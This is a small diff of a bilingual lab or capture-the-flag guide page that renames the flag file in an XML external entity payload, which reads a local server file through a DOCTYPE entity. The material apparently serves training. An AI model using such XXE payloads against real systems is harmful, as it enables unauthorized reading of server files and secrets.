@@ -123,7 +123,7 @@
     <h4>Leer la flag dedicada</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE ticket [
-  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe-flag.txt"&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe_flag.txt"&gt;
 ]&gt;
 &lt;ticket&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
@@ -229,7 +229,7 @@ curl -X POST http://TARGET_IP/xxe/api \
     <h4>Read the dedicated flag</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE ticket [
-  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe-flag.txt"&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe_flag.txt"&gt;
 ]&gt;
 &lt;ticket&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
